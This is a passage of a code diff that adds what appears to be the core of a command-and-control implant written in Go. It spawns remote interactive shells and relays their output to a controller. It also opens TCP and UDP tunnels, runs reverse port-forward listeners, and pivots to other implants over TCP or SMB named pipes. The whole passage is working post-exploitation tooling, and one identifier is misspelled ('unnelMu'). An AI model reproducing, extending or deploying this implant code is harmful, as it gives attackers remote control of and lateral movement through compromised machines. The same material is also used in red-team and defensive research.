+				args = append(args, current.String())
+				current.Reset()
+			}
+		default:
+			current.WriteByte(ch)
+		}
+	}
+	if current.Len() > 0 {
+		args = append(args, current.String())
+	}
+	return args
+}
+
+func startShellSession(shellID uint32, programArgs string) error {
+	args := splitArgs(programArgs)
+	var cmd *exec.Cmd
+	if len(args) == 0 {
+		if runtime.GOOS == "windows" {
+			cmd = exec.Command("cmd.exe")
+		} else {
+			cmd = exec.Command("/bin/sh")
+		}
+	} else {
+		cmd = exec.Command(args[0], args[1:]...)
+	}
+	stdin, err := cmd.StdinPipe()
+	if err != nil {
+		return err
+	}
+	stdout, err := cmd.StdoutPipe()
+	if err != nil {
+		_ = stdin.Close()
+		return err
+	}
+	cmd.Stderr = cmd.Stdout
+	if err := cmd.Start(); err != nil {
+		_ = stdin.Close()
+		_ = stdout.Close()
+		return err
+	}
+	jobs.AddWithID(shellID, impl.JobTypeShell)
+	sess := &shellSession{jobID: shellID, cmd: cmd, stdin: stdin, stdout: stdout}
+	shellMu.Lock()
+	shellSessions[shellID] = sess
+	shellMu.Unlock()
+	go shellReadLoop(sess)
+	return nil
+}
+
+func shellReadLoop(sess *shellSession) {
+	buf := make([]byte, 4096)
+	for {
+		n, err := sess.stdout.Read(buf)
+		if n > 0 {
+			w := protocol.NewWriterBE()
+			w.WriteUint8(protocol.JOB_TYPE_SHELL)
+			w.WriteUint8(protocol.JOB_STATE_RUNNING)
+			w.WriteString(string(buf[:n]))
+			queueBinaryResponse(sess.jobID, protocol.COMMAND_JOB, w.Bytes())
+		}
+		if err != nil {
+			break
+		}
+	}
+	_ = sess.cmd.Wait()
+	jobs.SetState(sess.jobID, impl.JobStateStopped)
+	jobs.Remove(sess.jobID)
+	shellMu.Lock()
+	delete(shellSessions, sess.jobID)
+	shellMu.Unlock()
+	w := protocol.NewWriterBE()
+	w.WriteUint8(protocol.JOB_TYPE_SHELL)
+	w.WriteUint8(protocol.JOB_STATE_KILLED)
+	queueBinaryResponse(sess.jobID, protocol.COMMAND_JOB, w.Bytes())
+}
+
+func writeShellInput(shellID uint32, data []byte) error {
+	shellMu.Lock()
+	sess := shellSessions[shellID]
+	shellMu.Unlock()
+	if sess == nil || sess.stdin == nil {
+		return os.ErrNotExist
+	}
+	_, err := sess.stdin.Write(data)
+	return err
+}
+
+func closeShellSession(shellID uint32) {
+	shellMu.Lock()
+	sess := shellSessions[shellID]
+	shellMu.Unlock()
+	if sess == nil {
+		return
+	}
+	sess.closeOnce.Do(func() {
+		if sess.stdin != nil {
+			_ = sess.stdin.Close()
+		}
+		if sess.cmd != nil && sess.cmd.Process != nil {
+			_ = sess.cmd.Process.Kill()
+		}
+	})
+}
+
+func startTCPTunnel(channelID uint32, tunnelType uint32, address string, port uint16) ([]byte, error) {
+	conn, err := net.DialTimeout("tcp", net.JoinHostPort(address, strconv.Itoa(int(port))), 5*time.Second)
+	if err != nil {
+		return tunnelStatusPayload(tunnelType, uint32(win32LikeNetError(err))), err
+	}
+	sess := &tunnelSession{id: channelID, tunnelType: tunnelType, conn: conn}
+	tunnelMu.Lock()
+	tunnelSessions[channelID] = sess
+	tunnelMu.Unlock()
+	go tunnelReadLoop(sess)
+	return tunnelStatusPayload(tunnelType, 0), nil
+}
+
+func startUDPTunnel(channelID uint32, address string, port uint16) ([]byte, error) {
+	conn, err := net.DialTimeout("udp", net.JoinHostPort(address, strconv.Itoa(int(port))), 5*time.Second)
+	if err != nil {
+		return tunnelStatusPayload(2, uint32(win32LikeNetError(err))), err
+	}
+	sess := &tunnelSession{id: channelID, tunnelType: 2, conn: conn}
+	tunnelMu.Lock()
+	tunnelSessions[channelID] = sess
+	tunnelMu.Unlock()
+	go tunnelReadLoop(sess)
+	return tunnelStatusPayload(2, 0), nil
+}
+
+func startReverseTunnel(tunnelID uint32, port uint16) []byte {
+	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
+	if err != nil {
+		return tunnelStatusPayload(reverseTunnelType, 1)
+	}
+	sess := &tunnelSession{id: tunnelID, tunnelType: reverseTunnelType, listener: listener}
+	tunnelMu.Lock()
+	tunnelSessions[tunnelID] = sess
+	tunnelMu.Unlock()
+	go reverseAcceptLoop(sess)
+	return tunnelStatusPayload(reverseTunnelType, 0)
+}
+
+func reverseAcceptLoop(sess *tunnelSession) {
+	for {
+		conn, err := sess.listener.Accept()
+		if err != nil {
+			return
+		}
+		channelID := nextTunnelChannel()
+		child := &tunnelSession{id: channelID, tunnelType: reverseTunnelType, conn: conn}
+		unnelMu.Lock()
+		tunnelSessions[channelID] = child
+		unnelMu.Unlock()
+		w := protocol.NewWriterBE()
+		w.WriteUint32(channelID)
+		queueBinaryResponse(sess.id, protocol.COMMAND_TUNNEL_ACCEPT, w.Bytes())
+		go tunnelReadLoop(child)
+	}
+}
+
+func tunnelReadLoop(sess *tunnelSession) {
+	buf := make([]byte, 64*1024)
+	for {
+		if sess.conn == nil {
+			return
+		}
+		if c, ok := sess.conn.(interface{ SetReadDeadline(time.Time) error }); ok {
+			_ = c.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
+		}
+		n, err := sess.conn.Read(buf)
+		if n > 0 {
+			tunnelMu.Lock()
+			paused := sess.serverPaused
+			tunnelMu.Unlock()
+			if !paused {
+				w := protocol.NewWriterBE()
+				w.WriteBytes(buf[:n])
+				queueBinaryResponse(sess.id, protocol.COMMAND_TUNNEL_WRITE_TCP, w.Bytes())
+			}
+		}
+		if ne, ok := err.(net.Error); ok && ne.Timeout() {
+			continue
+		}
+		if err != nil {
+			break
+		}
+	}
+	closeTunnelSession(sess.id)
+	queueTunnelClose(sess.id, sess.tunnelType, 1)
+}
+
+func writeTunnelData(channelID uint32, data []byte) error {
+	tunnelMu.Lock()
+	sess := tunnelSessions[channelID]
+	tunnelMu.Unlock()
+	if sess == nil || sess.conn == nil {
+		return os.ErrNotExist
+	}
+	_, err := sess.conn.Write(data)
+	return err
+}
+
+func setTunnelPaused(channelID uint32, paused bool) {
+	tunnelMu.Lock()
+	defer tunnelMu.Unlock()
+	if sess := tunnelSessions[channelID]; sess != nil {
+		sess.serverPaused = paused
+	}
+}
+
+func closeTunnelSession(channelID uint32) {
+	tunnelMu.Lock()
+	sess := tunnelSessions[channelID]
+	if sess != nil {
+		delete(tunnelSessions, channelID)
+	}
+	tunnelMu.Unlock()
+	if sess == nil {
+		return
+	}
+	sess.closeOnce.Do(func() {
+		if sess.conn != nil {
+			_ = sess.conn.Close()
+		}
+		if sess.listener != nil {
+			_ = sess.listener.Close()
+		}
+	})
+}
+
+func queueTunnelClose(channelID uint32, tunnelType uint32, result uint32) {
+	w := protocol.NewWriterBE()
+	w.WriteUint32(tunnelType)
+	w.WriteUint32(result)
+	queueBinaryResponse(channelID, protocol.COMMAND_TUNNEL_CLOSE, w.Bytes())
+}
+
+func tunnelStatusPayload(tunnelType uint32, result uint32) []byte {
+	w := protocol.NewWriterBE()
+	w.WriteUint32(tunnelType)
+	w.WriteUint32(result)
+	return w.Bytes()
+}
+
+func nextTunnelChannel() uint32 {
+	tunnelMu.Lock()
+	defer tunnelMu.Unlock()
+	nextTunnelID++
+	return nextTunnelID
+}
+
+func startPivotTCP(taskID uint32, address string, port uint16) ([]byte, error) {
+	conn, err := net.DialTimeout("tcp", net.JoinHostPort(address, strconv.Itoa(int(port))), 5*time.Second)
+	if err != nil {
+		return nil, err
+	}
+	sess := &pivotSession{id: taskID, kind: pivotTypeTCP, conn: conn}
+	payload, err := readPivotHandshake(sess)
+	if err != nil {
+		_ = conn.Close()
+		return nil, err
+	}
+	pivotMu.Lock()
+	pivotSessions[taskID] = sess
+	pivotMu.Unlock()
+	go pivotReadLoop(sess)
+	return payload, nil
+}
+
+func startPivotSMB(taskID uint32, pipeName string) ([]byte, error) {
+	pipe, err := os.OpenFile(agent.NormalizePath(pipeName), os.O_RDWR, 0)
+	if err != nil {
+		return nil, err
+	}
+	sess := &pivotSession{id: taskID, kind: pivotTypeSMB, pipe: pipe}
+	payload, err := readPivotHandshake(sess)
+	if err != nil {
+		_ = pipe.Close()
+		return nil, err
+	}
+	pivotMu.Lock()
+	pivotSessions[taskID] = sess
+	pivotMu.Unlock()
+	go pivotReadLoop(sess)
+	return payload, nil
+}
+
+func readPivotHandshake(sess *pivotSession) ([]byte, error) {
+	var payload []byte
+	if sess.conn != nil {
+		_ = sess.conn.SetReadDeadline(time.Now().Add(5 * time.Second))
+		payload = readPivotFrame(sess.conn)
+		_ = sess.conn.SetReadDeadline(time.Time{})
+	} else if sess.pipe != nil {
+		buf := make([]byte, 8192)
+		n, err := sess.pipe.Read(buf)
+		if err != nil {
+			return nil, err
+		}
+		payload = append([]byte(nil), buf[:n]...)
+		if len(payload) >= 8 {
+			sz := int(binary.LittleEndian.Uint32(payload[:4]))
+			if sz > 0 && sz == len(payload)-4 {
+				payload = payload[4:]
+			}
+		}
+	}
+	if len(payload) < 4 {
+		return nil, io.ErrUnexpectedEOF
+	}
+	watermark := binary.LittleEndian.Uint32(payload[:4])
+	w := protocol.NewWriterBE()
+	w.WriteUint8(sess.kind)
+	w.WriteUint32(watermark)
+	w.WriteBytes(payload[4:])
+	return w.Bytes(), nil
+}
+
+func readPivotFrame(conn net.Conn) []byte {
+	hdr := make([]byte, 4)
+	if _, err := io.ReadFull(conn, hdr); err != nil {
+		return nil
+	}
+	sz := int(binary.LittleEndian.Uint32(hdr))
+	if sz <= 0 || sz > 4*1024*1024 {
+		return nil
+	}
+	data := make([]byte, sz)
+	if _, err := io.ReadFull(conn, data); err != nil {
+		return nil
+	}
+	return data
+}
+
+func pivotReadLoop(sess *pivotSession) {
+	defer func() {
+		closePivotSessionAsync(sess.id)
+	}()
+	if sess.conn != nil {
+		for {
+			payload := readPivotFrame(sess.conn)
+			if len(payload) == 0 {
+				return
+			}
+			queuePivotData(sess.id, payload)
+		}
+	}
+	buf := make([]byte, 8192)
+	for {
+		n, err := sess.pipe.Read(buf)
+		if n > 0 {
+			queuePivotData(sess.id, buf[:n])
+		}
+		if err != nil {
+			return
+		}
+	}
+}
+
+func queuePivotData(pivotID uint32, data []byte) {
+	w := protocol.NewWriterBE()
+	w.WriteUint32(pivotID)
+	w.WriteBytes(data)
+	queueBinaryResponse(0, protocol.COMMAND_PIVOT_EXEC, w.Bytes())
+}
+
+func writePivotData(pivotID uint32, data []byte) error {
+	pivotMu.Lock()
+	sess := pivotSessions[pivotID]
+	pivotMu.Unlock()
+	if sess == nil {
+		return os.ErrNotExist
+	}
+	if sess.conn != nil {
+		hdr := make([]byte, 4)
+		binary.LittleEndian.PutUint32(hdr, uint32(len(data)))
+		if _, err := sess.conn.Write(hdr); err != nil {
+			return err
+		}
+		_, err := sess.conn.Write(data)
+		return err
+	}
+	_, err := sess.pipe.Write(data)
+	return err
+}
+
+func closePivotSession(pivotID uint32) uint8 {
+	pivotMu.Lock()
+	sess := pivotSessions[pivotID]
+	if sess != nil {
+		delete(pivotSessions, pivotID)
+	}
+	pivotMu.Unlock()
+	if sess == nil {
+		return 0
+	}
+	return closePivot(sess, false)
+}
+
+func closePivotSessionAsync(pivotID uint32) {
+	pivotMu.Lock()
+	sess := pivotSessions[pivotID]
+	if sess != nil {
+		delete(pivotSessions, pivotID)
+	}
+	pivotMu.Unlock()
+	if sess == nil {
+		return
+	}
+	t := closePivot(sess, true)
+	w := protocol.NewWriterBE()
+	w.WriteUint32(pivotID)
+	w.WriteUint8(t)
+	queueBinaryResponse(0, protocol.COMMAND_UNLINK, w.Bytes())
+}
+
+func closePivot(sess *pivotSession, disconnected bool) uint8 {
+	var kind uint8
+	if disconnected {
+		kind = pivotTypeDisconnect
+	} else {
+		kind = sess.kind
+	}
+	sess.closeOnce.Do(func() {
+		if sess.conn != nil {
+			_ = sess.conn.Close()
+		}
+		if sess.pipe != nil {
+			_ = sess.pipe.Close()
+		}
+	})
+	return kind
+}
+
+func win32LikeNetError(err error) uint32 {
+	if err == nil {
+		return 0
+	}
+	msg := strings.ToLower(err.Error())
+	switch {
+	case strings.Contains(msg, "refused"):
+		return winErrConnRefused
+	case strings.Contains(msg, "timed out"), strings.Contains(msg, "timeout"):
+		return winErrTimedOut
+	case strings.Contains(msg, "unreachable"):
+		return winErrHostUnreach
+	default:
+		return win32ErrorCode(err)
+	}
 }
